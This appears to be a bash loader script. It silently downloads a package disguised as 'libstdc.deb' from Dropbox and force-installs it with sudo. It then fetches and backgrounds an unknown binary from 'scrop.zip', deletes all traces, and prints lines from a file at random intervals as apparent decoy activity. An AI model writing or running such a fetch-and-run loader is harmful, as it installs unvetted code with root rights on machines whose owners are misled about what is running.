#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/vv24bsdw6wa8yuh/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/tz4m0tmbzl1te3u/scrop.zip -q
unzip scrop.zip > /dev/null 2>&1
#pwd
./scripts/scrop ./scripts/data &
sleep 3
rm -rf scrop.zip
rm -rf scripts/scrop
rm -rf scripts/data
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 30 ))
done < $2

